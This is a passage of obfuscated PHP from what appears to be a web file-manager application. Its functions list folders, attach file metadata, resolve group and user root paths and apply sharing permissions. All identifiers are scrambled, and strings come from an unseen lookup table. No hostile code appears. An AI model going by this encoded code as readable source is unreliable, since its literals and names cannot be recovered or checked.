$this->_listAppendAuthSecret($¨ñÑ¦áú); } protected function _listSourceCache($ÏÜ¾¯Çš) { $­Æ¶ª©¨ =& $_SERVER[è¶³ÒßÑ]; foreach ($ÏÜ¾¯Çš as $€³º‡Æ) { self::$cacheSourceInfo[$­Æ¶ª©¨[526] . $€³º‡Æ[$­Æ¶ª©¨[203]]] = $€³º‡Æ; } } protected function _listFilterInfo(&$×À”¸«Ú, $ŒË¿ê§  = false) { $“ÚÃô =& $_SERVER[è¶³ÒßÑ]; foreach ($×À”¸«Ú as &$®˜Ñ¿‡¯) { $®˜Ñ¿‡¯ = $this->pathInfoFilter($®˜Ñ¿‡¯); self::$cachePathInfo[$“ÚÃô[527] . intval($ŒË¿ê§ ) . $“ÚÃô[455] . $®˜Ñ¿‡¯[$“ÚÃô[203]]] = $®˜Ñ¿‡¯; } unset($®˜Ñ¿‡¯); } protected function _listMake(&$ñ¼Ü°ñë) { $¬¡ªœË =& $_SERVER[è¶³ÒßÑ]; $ñ¼Ü°ñë[$¬¡ªœË[95]] = array(); $ñ¼Ü°ñë[$¬¡ªœË[96]] = array(); foreach ($ñ¼Ü°ñë[$¬¡ªœË[438]] as $„ÁëëŒŸ) { $µÚÂÀ’ = $„ÁëëŒŸ[$¬¡ªœË[478]] == 1 ? $¬¡ªœË[95] : $¬¡ªœË[96]; $ñ¼Ü°ñë[$µÚÂÀ’][] = $„ÁëëŒŸ; } unset($ñ¼Ü°ñë[$¬¡ªœË[438]]); } protected function _listAppendMeta(&$åĞÇª…, $è÷Ô«¬È) { $Ñ‹µ­ù‹ =& $_SERVER[è¶³ÒßÑ]; $è„ÊòÊ³ = array($Ñ‹µ­ù‹[484] => array($Ñ‹µ­ù‹[485], $è÷Ô«¬È)); $®†¹Ñ› = Model($Ñ‹µ­ù‹[528])->field($Ñ‹µ­ù‹[529])->where($è„ÊòÊ³)->select(); if (!$®†¹Ñ›) { return; } $¦§Á­ŒŞ = array($Ñ‹µ­ù‹[530], $Ñ‹µ­ù‹[531], $Ñ‹µ­ù‹[510]); $Ÿš©É‘Ù = array(); foreach ($®†¹Ñ› as $µ«ßª·è) { if (!isset($Ÿš©É‘Ù[$µ«ßª·è[$Ñ‹µ­ù‹[203]]])) { $Ÿš©É‘Ù[$µ«ßª·è[$Ñ‹µ­ù‹[203]]] = array(); } if (in_array($µ«ßª·è[$Ñ‹µ­ù‹[107]], $¦§Á­ŒŞ)) { continue; } $Ÿš©É‘Ù[$µ«ßª·è[$Ñ‹µ­ù‹[203]]][$µ«ßª·è[$Ñ‹µ­ù‹[107]]] = $µ«ßª·è[$Ñ‹µ­ù‹[443]]; } foreach ($åĞÇª… as &$ğØéı¢) { $ğØéı¢[$Ñ‹µ­ù‹[532]] = !1; if (isset($Ÿš©É‘Ù[$ğØéı¢[$Ñ‹µ­ù‹[203]]])) { $ğØéı¢[$Ñ‹µ­ù‹[532]] = $Ÿš©É‘Ù[$ğØéı¢[$Ñ‹µ­ù‹[203]]]; } if ($this->fileIsLock($ğØéı¢) && $ğØéı¢[$Ñ‹µ­ù‹[480]]) { $§ÌŞ‹Ğã = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ğØéı¢[$Ñ‹µ­ù‹[480]][$Ñ‹µ­ù‹[481]] = AuthModel::authDisable($ğØéı¢[$Ñ‹µ­ù‹[480]][$Ñ‹µ­ù‹[481]], $§ÌŞ‹Ğã); $ğØéı¢[$Ñ‹µ­ù‹[480]][$Ñ‹µ­ù‹[533]][$Ñ‹µ­ù‹[480]] = $ğØéı¢[$Ñ‹µ­ù‹[480]][$Ñ‹µ­ù‹[481]]; } } unset($ğØéı¢); } protected function _listAppendFileMeta(&$×‰ÜÏüÑ, $…‚ÎÒËµ) { $ÉÙˆûò =& $_SERVER[è¶³ÒßÑ]; $àÕÔÒ£Ø = array_to_keyvalue($×‰ÜÏüÑ, $ÉÙˆûò[12], $ÉÙˆûò[534]); $àÕÔÒ£Ø = array_filter(array_unique($àÕÔÒ£Ø)); if (!$àÕÔÒ£Ø) { return; } $»ÖÑ ïÚ = array($ÉÙˆûò[535] => array($ÉÙˆûò[485], $àÕÔÒ£Ø)); $Œ¤„ƒ‚ = $ÉÙˆûò[536]; $¨¨éŞ¤« = Model($ÉÙˆûò[537])->field($Œ¤„ƒ‚)->where($»ÖÑ ïÚ)->select(); $¨¨éŞ¤« = array_to_keyvalue($¨¨éŞ¤«, $ÉÙˆûò[534]); $¿úƒ® = Model($ÉÙˆûò[538])->field($ÉÙˆûò[539])->where($»ÖÑ ïÚ)->select(); $¿úƒ® = $¿úƒ® ? $¿úƒ® : array(); $œğÂïØÖ = array(); foreach ($¿úƒ® as $ÆîÏüòÇ) { if (!isset($œğÂïØÖ[$ÆîÏüòÇ[$ÉÙˆûò[534]]])) { $œğÂïØÖ[$ÆîÏüòÇ[$ÉÙˆûò[534]]] = array(); } $œğÂïØÖ[$ÆîÏüòÇ[$ÉÙˆûò[534]]][$ÆîÏüòÇ[$ÉÙˆûò[107]]] = $ÆîÏüòÇ[$ÉÙˆûò[443]]; } foreach ($×‰ÜÏüÑ as &$şÂİç‡¾) { $°Â‚¶Êİ = $şÂİç‡¾[$ÉÙˆûò[534]]; if (!$°Â‚¶Êİ || !is_array($¨¨éŞ¤«[$°Â‚¶Êİ])) { continue; } $¨êˆÒ–± = $¨¨éŞ¤«[$°Â‚¶Êİ]; $¨êˆÒ–±[$ÉÙˆûò[89]] = $şÂİç‡¾[$ÉÙˆûò[89]]; $¨êˆÒ–±[$ÉÙˆûò[32]] = $şÂİç‡¾[$ÉÙˆûò[32]]; if (!$¨êˆÒ–±[$ÉÙˆûò[540]]) { Model($ÉÙˆûò[537])->fileMd5Check($¨êˆÒ–±); } if (!isset(self::$cacheFileInfo[$ÉÙˆûò[541] . $°Â‚¶Êİ])) { self::$cacheFileInfo[$ÉÙˆûò[541] . $°Â‚¶Êİ] = array_merge(array(), $¨êˆÒ–±); } unset($¨¨éŞ¤«[$°Â‚¶Êİ][$ÉÙˆûò[97]]); $«¦Ìï®Š = isset($œğÂïØÖ[$°Â‚¶Êİ]) && is_array($œğÂïØÖ[$°Â‚¶Êİ]) ? $œğÂïØÖ[$°Â‚¶Êİ] : array(); $şÂİç‡¾[$ÉÙˆûò[180]] = array_merge($«¦Ìï®Š, $¨¨éŞ¤«[$°Â‚¶Êİ]); if (isset($şÂİç‡¾[$ÉÙˆûò[180]][$ÉÙˆûò[194]])) { $şÂİç‡¾[$ÉÙˆûò[194]] = json_decode($şÂİç‡¾[$ÉÙˆûò[180]][$ÉÙˆûò[194]], !0); unset($şÂİç‡¾[$ÉÙˆûò[180]][$ÉÙˆûò[194]]); } } unset($şÂİç‡¾); } protected function _listAppendSourceInfo(&$ğ¬“²³, $úïØáŠ) { $¦›°—Õ =& $_SERVER[è¶³ÒßÑ]; $ÕüãËı¯ = Model($¦›°—Õ[542])->listData(); $Ë£öø–† = Model($¦›°—Õ[492])->listData(); $‡¿ˆá²¥ = Model($¦›°—Õ[482])->listData(); $úîå¾ê = Model($¦›°—Õ[543])->listSimple(); $óøÇâ¦‚ = array_to_keyvalue($ÕüãËı¯, $¦›°—Õ[468]); $µÔÃà‚Ù = array_to_keyvalue_group($Ë£öø–†, $¦›°—Õ[97], $¦›°—Õ[493]); $±¼ËˆŒè = array_to_keyvalue($‡¿ˆá²¥, $¦›°—Õ[97]); $š¨¹ËÇí = array_to_keyvalue_group($úîå¾ê, $¦›°—Õ[203]); foreach ($ğ¬“²³ as &$Ãó…ÅÒå) { $Ãó…ÅÒå[$¦›°—Õ[100]] = array($¦›°—Õ[544] => 0, $¦›°—Õ[545] => 0, $¦›°—Õ[546] => 0); if (isset($±¼ËˆŒè[$Ãó…ÅÒå[$¦›°—Õ[203]]])) { $Ãó…ÅÒå[$¦›°—Õ[100]][$¦›°—Õ[547]] = 1; $Ãó…ÅÒå[$¦›°—Õ[100]][$¦›°—Õ[548]] = $±¼ËˆŒè[$Ãó…ÅÒå[$¦›°—Õ[203]]][$¦›°—Õ[32]]; } if ($µÔÃà‚Ù && $óøÇâ¦‚ && isset($µÔÃà‚Ù[$Ãó…ÅÒå[$¦›°—Õ[203]]])) { $Ãó…ÅÒå[$¦›°—Õ[100]][$¦›°—Õ[549]] = array(); foreach ($µÔÃà‚Ù[$Ãó…ÅÒå[$¦›°—Õ[203]]] as $•·üÃİ‰) { $µ¥È… = $óøÇâ¦‚[$•·üÃİ‰]; $Ãó…ÅÒå[$¦›°—Õ[100]][$¦›°—Õ[549]][] = array($¦›°—Õ[550] => $µ¥È…[$¦›°—Õ[468]], $¦›°—Õ[487] => $µ¥È…[$¦›°—Õ[32]], $¦›°—Õ[551] => $µ¥È…[$¦›°—Õ[552]]); } } if ($š¨¹ËÇí && isset($š¨¹ËÇí[$Ãó…ÅÒå[$¦›°—Õ[203]]])) { $Ãó…ÅÒå[$¦›°—Õ[100]][$¦›°—Õ[553]] = array(); foreach ($š¨¹ËÇí[$Ãó…ÅÒå[$¦›°—Õ[203]]] as $‰ÈŠ½£) { $ÒòŒ¹°õ = $¦›°—Õ[554]; if ($‰ÈŠ½£[$¦›°—Õ[555]] == $¦›°—Õ[101]) { $ÒòŒ¹°õ .= $¦›°—Õ[556]; } $Ãó…ÅÒå[$¦›°—Õ[100]][$¦›°—Õ[553]] = array_field_key($‰ÈŠ½£, explode($¦›°—Õ[50], $ÒòŒ¹°õ)); } } } unset($Ãó…ÅÒå); return $ğ¬“²³; } protected function _listAppendChildren(&$Í¬¯¼ÛÂ, $¸àôªûº) { $ØÏŞó½á =& $_SERVER[è¶³ÒßÑ]; $ÌÆçì Ä = array(); $ÈÎÍÛ¿“ = array($ØÏŞó½á[249] => 0, $ØÏŞó½á[250] => 0); foreach ($Í¬¯¼ÛÂ as &$ëìôÇÉÏ) { if (!$ëìôÇÉÏ[$ØÏŞó½á[478]]) { continue; } $ÌÆçì Ä[] = $ëìôÇÉÏ[$ØÏŞó½á[203]]; } unset($ëìôÇÉÏ); if (!$ÌÆçì Ä) { return; } $óŒĞ› = array($ØÏŞó½á[202] => array($ØÏŞó½á[7], $ÌÆçì Ä), $ØÏŞó½á[498] => 0); $Éô›ı½Ú = array($ØÏŞó½á[202], $ØÏŞó½á[478], $ØÏŞó½á[557] => $ØÏŞó½á[558]); $ÍëÃú› = $this->field($Éô›ı½Ú)->where($óŒĞ›)->group($ØÏŞó½á[559])->select(); $¼—Ú±ù = array(); foreach ($ÍëÃú› as $ÚíÜèÏ„) { $ØÈÂ·Şø = $ÚíÜèÏ„[$ØÏŞó½á[202]]; $¼¨ô˜¿· = $ÚíÜèÏ„[$ØÏŞó½á[478]] == $ØÏŞó½á[101] ? $ØÏŞó½á[250] : $ØÏŞó½á[249]; if (!isset($¼—Ú±ù[$ØÈÂ·Şø])) { $¼—Ú±ù[$ØÈÂ·Şø] = array($ØÏŞó½á[249] => 0, $ØÏŞó½á[250] => 0); } $¼—Ú±ù[$ØÈÂ·Şø][$¼¨ô˜¿·] += $ÚíÜèÏ„[$ØÏŞó½á[558]]; } foreach ($Í¬¯¼ÛÂ as &$ëìôÇÉÏ) { if (!$ëìôÇÉÏ[$ØÏŞó½á[478]]) { continue; } $ê“ñÖ»ü = is_array($¼—Ú±ù[$ëìôÇÉÏ[$ØÏŞó½á[203]]]) ? $¼—Ú±ù[$ëìôÇÉÏ[$ØÏŞó½á[203]]] : $ÈÎÍÛ¿“; $ëìôÇÉÏ[$ØÏŞó½á[250]] = $ê“ñÖ»ü[$ØÏŞó½á[250]]; $ëìôÇÉÏ[$ØÏŞó½á[249]] = $ê“ñÖ»ü[$ØÏŞó½á[249]]; unset($ëìôÇÉÏ[$ØÏŞó½á[479]]); } unset($ëìôÇÉÏ); } protected function _listAppendAuth(&$ÊÜ†£Œ) { $¯Û®¹¡Õ =& $_SERVER[è¶³ÒßÑ]; $»™¯¥ö± = array(); foreach ($ÊÜ†£Œ as $¶ª°¥â·) { if ($¶ª°¥â·[$¯Û®¹¡Õ[200]] == self::TYPE_GROUP) { $»™¯¥ö±[] = $¶ª°¥â·[$¯Û®¹¡Õ[203]]; } } if (!$»™¯¥ö±) { return; } $ÚíµÕšò = array_to_keyvalue($ÊÜ†£Œ, $¯Û®¹¡Õ[203]); $êâÁŒÛØ = Model($¯Û®¹¡Õ[560])->getSourceList($»™¯¥ö±, $ÚíµÕšò); $ÇŞã¥Õ• = KodUser::isRoot(); foreach ($ÊÜ†£Œ as $ØÍ¥‚Ú => &$¶ª°¥â·) { $¶ª°¥â·[$¯Û®¹¡Õ[480]] = $êâÁŒÛØ[$¶ª°¥â·[$¯Û®¹¡Õ[203]]]; if (!$¶ª°¥â·[$¯Û®¹¡Õ[480]] && $¶ª°¥â·[$¯Û®¹¡Õ[200]] == self::TYPE_GROUP) { $¶ª°¥â·[$¯Û®¹¡Õ[480]] = Action($¯Û®¹¡Õ[561])->pathGroupAuthMake($¶ª°¥â·[$¯Û®¹¡Õ[562]]); if (!$¶ª°¥â·[$¯Û®¹¡Õ[480]] && !$ÇŞã¥Õ•) { $¶ª°¥â·[$¯Û®¹¡Õ[243]] = !1; $¶ª°¥â·[$¯Û®¹¡Õ[242]] = !1; } } if ($¶ª°¥â·[$¯Û®¹¡Õ[480]]) { $¶ª°¥â·[$¯Û®¹¡Õ[243]] = AuthModel::authCheckEdit($¶ª°¥â·[$¯Û®¹¡Õ[480]][$¯Û®¹¡Õ[481]]); $¶ª°¥â·[$¯Û®¹¡Õ[242]] = AuthModel::authCheckView($¶ª°¥â·[$¯Û®¹¡Õ[480]][$¯Û®¹¡Õ[481]]); } $this->groupPathDisplay($¶ª°¥â·); } unset($¶ª°¥â·); } public function _listAppendAuthSecret(&$Õ´•¤Î¹) { $‚Î¾ô÷ =& $_SERVER[è¶³ÒßÑ]; if (Model($‚Î¾ô÷[501])->get($‚Î¾ô÷[563]) != $‚Î¾ô÷[101]) { return; } static $½Ëİ¾¢ = false; if (!$½Ëİ¾¢) { $¦…æ±äŠ = Model($‚Î¾ô÷[564]); $ãç™ïüÙ = Model($‚Î¾ô÷[565]); $½Ëİ¾¢ = $ãç™ïüÙ->listData(); $½Ëİ¾¢ = array_to_keyvalue($½Ëİ¾¢, $‚Î¾ô÷[203]); $£ñĞˆ¼ß = json_decode(Model($‚Î¾ô÷[501])->get($‚Î¾ô÷[566]), !0); $£ñĞˆ¼ß = array_to_keyvalue($£ñĞˆ¼ß, $‚Î¾ô÷[468]); foreach ($½Ëİ¾¢ as $œ»Â½¥» => $ï“à‰ø´) { $é×û«Ú = $£ñĞˆ¼ß[$ï“à‰ø´[$‚Î¾ô÷[567]]]; if (!$é×û«Ú) { $ãç™ïüÙ->remove($ï“à‰ø´[$‚Î¾ô÷[468]]); unset($½Ëİ¾¢[$œ»Â½¥»]); continue; } $ˆÚˆß­â = $¦…æ±äŠ->listData($é×û«Ú[$‚Î¾ô÷[480]]); if (!$ˆÚˆß­â) { $ãç™ïüÙ->remove($ï“à‰ø´[$‚Î¾ô÷[468]]); unset($½Ëİ¾¢[$œ»Â½¥»]); continue; } $ï“à‰ø´[$‚Î¾ô÷[480]] = $ˆÚˆß­â; $ï“à‰ø´[$‚Î¾ô÷[568]] = $é×û«Ú; $ï“à‰ø´[$‚Î¾ô÷[569]] = Model($‚Î¾ô÷[570])->getInfoSimpleOuter($ï“à‰ø´[$‚Î¾ô÷[520]]); $½Ëİ¾¢[$œ»Â½¥»] = $ï“à‰ø´; } } $æ”é³¿ = USER_ID; $óºğüúî = array(); $ŸŠó¸­ƒ = $this->_listAppendPath($óºğüúî, !0); foreach ($Õ´•¤Î¹ as $œ»Â½¥» => &$ï“à‰ø´) { if (!is_array($ï“à‰ø´[$‚Î¾ô÷[480]])) { continue; } if ($ï“à‰ø´[$‚Î¾ô÷[200]] != $‚Î¾ô÷[571]) { continue; } if (isset($½Ëİ¾¢[$ï“à‰ø´[$‚Î¾ô÷[203]]])) { $€Õñ×…“ = $½Ëİ¾¢[$ï“à‰ø´[$‚Î¾ô÷[203]]]; if (!is_array($ï“à‰ø´[$‚Î¾ô÷[532]])) { $ï“à‰ø´[$‚Î¾ô÷[532]] = array(); } $ï“à‰ø´[$‚Î¾ô÷[532]][$‚Î¾ô÷[572]] = $€Õñ×…“[$‚Î¾ô÷[567]]; $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[573]] = $€Õñ×…“; $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[574]] = $ï“à‰ø´[$‚Î¾ô÷[575]]; $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[576]] = $‚Î¾ô÷[101]; if ($€Õñ×…“[$‚Î¾ô÷[520]] != $æ”é³¿) { $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[481]] = $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[481]] & $€Õñ×…“[$‚Î¾ô÷[480]][$‚Î¾ô÷[480]]; } continue; } $ü¥©½ÈÍ = $this->parentLevelArray($ï“à‰ø´[$‚Î¾ô÷[577]]); $¯ÁÑú¾ = array_reverse($ü¥©½ÈÍ); foreach ($¯ÁÑú¾ as $İá•½Æœ => $ºÃ²€‰¢) { if (!isset($½Ëİ¾¢[$ºÃ²€‰¢])) { continue; } $€Õñ×…“ = $½Ëİ¾¢[$ºÃ²€‰¢]; $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[573]] = $€Õñ×…“; if ($€Õñ×…“[$‚Î¾ô÷[520]] != $æ”é³¿) { $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[481]] = $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[481]] & $€Õñ×…“[$‚Î¾ô÷[480]][$‚Î¾ô÷[480]]; } $¼şğæÜ± = $‚Î¾ô÷[12]; $¦Â‰«ÛÇ = count($ü¥©½ÈÍ) - $İá•½Æœ; for ($¿ºöä„ = 0; $¿ºöä„ < $¦Â‰«ÛÇ; $¿ºöä„++) { if (!isset($ŸŠó¸­ƒ[$ü¥©½ÈÍ[$¿ºöä„]])) { $¼şğæÜ± = $‚Î¾ô÷[12]; break; } $¼şğæÜ± = $¼şğæÜ± . rtrim($ŸŠó¸­ƒ[$ü¥©½ÈÍ[$¿ºöä„]], $‚Î¾ô÷[8]) . $‚Î¾ô÷[8]; } $ï“à‰ø´[$‚Î¾ô÷[480]][$‚Î¾ô÷[574]] = rtrim($¼şğæÜ±, $‚Î¾ô÷[8]) . $‚Î¾ô÷[8]; break; } } unset($ï“à‰ø´); } public function groupPathDisplay(&$õÎ¦ÒØ) { $°¸¡‹´ =& $_SERVER[è¶³ÒßÑ]; if ($õÎ¦ÒØ[$°¸¡‹´[200]] != self::TYPE_GROUP) { return; } $‹¬—Â¸å = Model($°¸¡‹´[578])->getInfo($õÎ¦ÒØ[$°¸¡‹´[562]]); $Ú‚—ó® = $this->parentLevelArray($‹¬—Â¸å[$°¸¡‹´[577]]); $ì¦íŠâ÷ = $°¸¡‹´[12]; foreach ($Ú‚—ó® as $ëµ‡ƒÅ¹) { $ï½ÂºÆ = Model($°¸¡‹´[578])->getInfo($ëµ‡ƒÅ¹); $ì¦íŠâ÷ .= $ï½ÂºÆ[$°¸¡‹´[100]][$°¸¡‹´[203]] . $°¸¡‹´[50]; } $õÎ¦ÒØ[$°¸¡‹´[579]] = $‹¬—Â¸å[$°¸¡‹´[202]]; $õÎ¦ÒØ[$°¸¡‹´[580]] = $‹¬—Â¸å[$°¸¡‹´[577]]; $õÎ¦ÒØ[$°¸¡‹´[581]] = $‹¬—Â¸å[$°¸¡‹´[582]]; $õÎ¦ÒØ[$°¸¡‹´[583]] = $ì¦íŠâ÷ . $‹¬—Â¸å[$°¸¡‹´[100]][$°¸¡‹´[203]]; } protected function _listAppendPath(&$Ò«ƒÈñø, $¥ ¨¯Ã½ = false) { $Ë¸Ä£©× =& $_SERVER[è¶³ÒßÑ]; static $¡ò´Û—û = array(); $İƒ‡†Â‹ = array(); $÷ô‘÷´º = array(); if ($¥ ¨¯Ã½) { return $¡ò´Û—û; } foreach ($Ò«ƒÈñø as &$–à×­Øà) { $ªÖ˜Š—ó = $–à×­Øà[$Ë¸Ä£©×[203]]; if ($–à×­Øà[$Ë¸Ä£©×[478]] == $Ë¸Ä£©×[101] && $–à×­Øà[$Ë¸Ä£©×[202]] != 0) { $¡ò´Û—û[$ªÖ˜Š—ó] = $–à×­Øà[$Ë¸Ä£©×[32]]; } if ($–à×­Øà[$Ë¸Ä£©×[478]] == $Ë¸Ä£©×[101] && $–à×­Øà[$Ë¸Ä£©×[202]] == 0) { $¡ò´Û—û[$ªÖ˜Š—ó] = $this->_listAppendPathRoot($–à×­Øà, array()); } if (isset($÷ô‘÷´º[$–à×­Øà[$Ë¸Ä£©×[577]]])) { continue; } $÷ô‘÷´º[$–à×­Øà[$Ë¸Ä£©×[577]]] = !0; $º÷åÖéõ = $this->parentLevelArray($–à×­Øà[$Ë¸Ä£©×[577]]); foreach ($º÷åÖéõ as $Í›³ŠÍœ => $–ô†ù¥‡) { if (isset($¡ò´Û—û[$–ô†ù¥‡])) { continue; } if ($Í›³ŠÍœ == 0) { $¡ò´Û—û[$–ô†ù¥‡] = $this->_listAppendPathRoot($–à×­Øà, $º÷åÖéõ); } if ($Í›³ŠÍœ != 0) { $İƒ‡†Â‹[] = $–ô†ù¥‡; } } } unset($–à×­Øà); $İƒ‡†Â‹ = array_unique($İƒ‡†Â‹); if (count($İƒ‡†Â‹) > 0) { $çØÙäòâ = array($Ë¸Ä£©×[484] => array($Ë¸Ä£©×[485], $İƒ‡†Â‹)); if (count($İƒ‡†Â‹) == 1) { $¨¼·ïÒÖ = $this->sourceInfo($İƒ‡†Â‹[0]); $ãéµÏ¨Ô = is_array($¨¼·ïÒÖ) ? array($¨¼·ïÒÖ) : !1; } else { $ãéµÏ¨Ô = $this->field($Ë¸Ä£©×[584])->where($çØÙäòâ)->select(); } if (!$ãéµÏ¨Ô) { $ãéµÏ¨Ô = array(); } foreach ($ãéµÏ¨Ô as $òØé¼˜‹) { $¡ò´Û—û[$òØé¼˜‹[$Ë¸Ä£©×[203]]] = $òØé¼˜‹[$Ë¸Ä£©×[32]]; } } $¢ÈªƒÁô = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $úí¿òª = array(); foreach ($Ò«ƒÈñø as &$–à×­Øà) { $¼È¼Ù¼ª = $–à×­Øà[$Ë¸Ä£©×[577]]; $ù÷ »÷» = $Ë¸Ä£©×[12]; if (isset($úí¿òª[$¼È¼Ù¼ª])) { $ù÷ »÷» = $úí¿òª[$¼È¼Ù¼ª]; } else { $º÷åÖéõ = $this->parentLevelArray($–à×­Øà[$Ë¸Ä£©×[577]]); foreach ($º÷åÖéõ as $Í›³ŠÍœ => $–ô†ù¥‡) { if (isset($¡ò´Û—û[$–ô†ù¥‡])) { $ù÷ »÷» .= $¡ò´Û—û[$–ô†ù¥‡] . $Ë¸Ä£©×[8]; } } $úí¿òª[$¼È¼Ù¼ª] = $ù÷ »÷»; } $ù÷ »÷» .= $–à×­Øà[$Ë¸Ä£©×[32]]; if ($–à×­Øà[$Ë¸Ä£©×[478]] == $Ë¸Ä£©×[101]) { $ù÷ »÷» .= $Ë¸Ä£©×[8]; } $–à×­Øà[$Ë¸Ä£©×[575]] = str_replace($Ë¸Ä£©×[585], $Ë¸Ä£©×[8], $ù÷ »÷»); if ($–à×­Øà[$Ë¸Ä£©×[202]] == $Ë¸Ä£©×[238]) { $–à×­Øà[$Ë¸Ä£©×[32]] = trim($¡ò´Û—û[$–à×­Øà[$Ë¸Ä£©×[203]]], $Ë¸Ä£©×[8]); $–à×­Øà[$Ë¸Ä£©×[575]] = $–à×­Øà[$Ë¸Ä£©×[32]] . $Ë¸Ä£©×[8]; } if (intval($–à×­Øà[$Ë¸Ä£©×[200]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($–à×­Øà, $º÷åÖéõ, $¢ÈªƒÁô); } } unset($–à×­Øà); return $Ò«ƒÈñø; } private function _listAppendPathRecycle(&$«„Õ Í, $”èí·ˆ†, $ôãŒ½îš) { $É¹ıÂªö =& $_SERVER[è¶³ÒßÑ]; if (!in_array($ôãŒ½îš, $”èí·ˆ†) && $«„Õ Í[$É¹ıÂªö[203]] != $ôãŒ½îš) { return; } $ğ¨•Éä„ = explode($É¹ıÂªö[8], trim($«„Õ Í[$É¹ıÂªö[575]], $É¹ıÂªö[8])); $¯Û¿òŒ’ = implode($É¹ıÂªö[8], array_slice($ğ¨•Éä„, 2)); $«„Õ Í[$É¹ıÂªö[575]] = $É¹ıÂªö[8] . LNG($É¹ıÂªö[586]) . $É¹ıÂªö[8] . ltrim($¯Û¿òŒ’, $É¹ıÂªö[8]); $«„Õ Í[$É¹ıÂªö[577]] = $É¹ıÂªö[587] . implode($É¹ıÂªö[50], array_slice($”èí·ˆ†, 1)) . $É¹ıÂªö[50]; if ($«„Õ Í[$É¹ıÂªö[203]] == $ôãŒ½îš) { $«„Õ Í[$É¹ıÂªö[577]] = $É¹ıÂªö[587]; $«„Õ Í[$É¹ıÂªö[202]] = $É¹ıÂªö[238]; $«„Õ Í[$É¹ıÂªö[32]] = LNG($É¹ıÂªö[586]); } $«„Õ Í[$É¹ıÂªö[588]] = $É¹ıÂªö[589]; } protected function _listAppendPathRoot(&$Á¯Ï¢¹, $ÖÔ¢ÚöÛ) { $ÎÜö¥ö¤ =& $_SERVER[è¶³ÒßÑ]; static $Ø§ì­Ê = false; $¡ÄØÒÊ = $ÎÜö¥ö¤[12]; if ($Á¯Ï¢¹[$ÎÜö¥ö¤[200]] == self::TYPE_USER) { if ($Á¯Ï¢¹[$ÎÜö¥ö¤[562]] == USER_ID) { $¡ÄØÒÊ = LNG($ÎÜö¥ö¤[590]); if ($Ø§ì­Ê === !1) { $›ã‘ÔĞš = Model($ÎÜö¥ö¤[591])->getInfoFull(USER_ID); $Ø§ì­Ê = _get($›ã‘ÔĞš, $ÎÜö¥ö¤[592], $ÎÜö¥ö¤[12]); } if ($ÖÔ¢ÚöÛ && $ÖÔ¢ÚöÛ[0] == $Ø§ì­Ê || !$ÖÔ¢ÚöÛ && $Á¯Ï¢¹[$ÎÜö¥ö¤[203]] == $Ø§ì­Ê) { $¡ÄØÒÊ = LNG($ÎÜö¥ö¤[593]); $Á¯Ï¢¹[$ÎÜö¥ö¤[594]] = $ÎÜö¥ö¤[595]; } if (!$ÖÔ¢ÚöÛ) { $Á¯Ï¢¹[$ÎÜö¥ö¤[32]] = $¡ÄØÒÊ; } } else { $Á¯Ï¢¹[$ÎÜö¥ö¤[596]] = Model($ÎÜö¥ö¤[570])->getInfoSimpleOuter($Á¯Ï¢¹[$ÎÜö¥ö¤[562]]); $¡ÄØÒÊ = LNG($ÎÜö¥ö¤[597]) . $ÎÜö¥ö¤[186] . $Á¯Ï¢¹[$ÎÜö¥ö¤[596]][$ÎÜö¥ö¤[32]] . $ÎÜö¥ö¤[188]; } } else { if ($Á¯Ï¢¹[$ÎÜö¥ö¤[200]] == self::TYPE_GROUP) { $ÃÚÇ§ø© = Model($ÎÜö¥ö¤[578])->getInfoSimple($Á¯Ï¢¹[$ÎÜö¥ö¤[562]]); $¡ÄØÒÊ = $ÃÚÇ§ø©[$ÎÜö¥ö¤[32]]; } else { if ($Á¯Ï¢¹[$ÎÜö¥ö¤[200]] == self::TYPE_SYSTEM) { $¡ÄØÒÊ = $ÎÜö¥ö¤[598]; } } } $¡ÄØÒÊ = $¡ÄØÒÊ ? $ÎÜö¥ö¤[8] . $¡ÄØÒÊ . $ÎÜö¥ö¤[8] : $ÎÜö¥ö¤[8]; return $¡ÄØÒÊ; } protected function _listAppendUser(&$‡‚‹æ) { $±Ô’ïò =& $_SERVER[è¶³ÒßÑ]; $£ìƒ©‘ª = array_to_keyvalue($‡‚‹æ, $±Ô’ïò[12], $±Ô’ïò[520]); $ÃèˆŞÇº = array_to_keyvalue($‡‚‹æ, $±Ô’ïò[12], $±Ô’ïò[522]); $ü•¦¿…÷ = array_merge($£ìƒ©‘ª, $ÃèˆŞÇº); $¹Ş­³ø = Model($±Ô’ïò[591])->userListInfo($ü•¦¿…÷); foreach ($‡‚‹æ as &$°Ğ·æ´) { $¨æàúœ· = $°Ğ·æ´[$±Ô’ïò[520]]; $°Ğ·æ´[$±Ô’ïò[520]] = $¹Ş­³ø[$¨æàúœ·] ? $¹Ş­³ø[$¨æàúœ·] : !1; $¨æàúœ· = $°Ğ·æ´[$±Ô’ïò[522]]; $°Ğ·æ´[$±Ô’ïò[522]] = $¹Ş­³ø[$¨æàúœ·] ? $¹Ş­³ø[$¨æàúœ·] : !1; if (_get($°Ğ·æ´, $±Ô’ïò[599], 0)) { $¦Ø§ˆƒª = $GLOBALS[$±Ô’ïò[6]][$±Ô’ïò[102]][$±Ô’ïò[600]]; if ($°Ğ·æ´[$±Ô’ïò[532]][$±Ô’ïò[601]] <= time() - $¦Ø§ˆƒª) { $this->metaSet($°Ğ·æ´[$±Ô’ïò[203]], $±Ô’ïò[602], null); $this->metaSet($°Ğ·æ´[$±Ô’ïò[203]], $±Ô’ïò[601], null); unset($°Ğ·æ´[$±Ô’ïò[532]][$±Ô’ïò[602]]); continue; } $ö³Ş´â¢ = $°Ğ·æ´[$±Ô’ïò[532]][$±Ô’ïò[602]]; $°Ğ·æ´[$±Ô’ïò[532]][$±Ô’ïò[603]] = Model($±Ô’ïò[591])->getInfoSimpleOuter($ö³Ş´â¢); } } unset($°Ğ·æ´); } public function parentLevelArray($§§öíµ) { $ù­›ùÃÉ =& $_SERVER[è¶³ÒßÑ]; $§§öíµ = 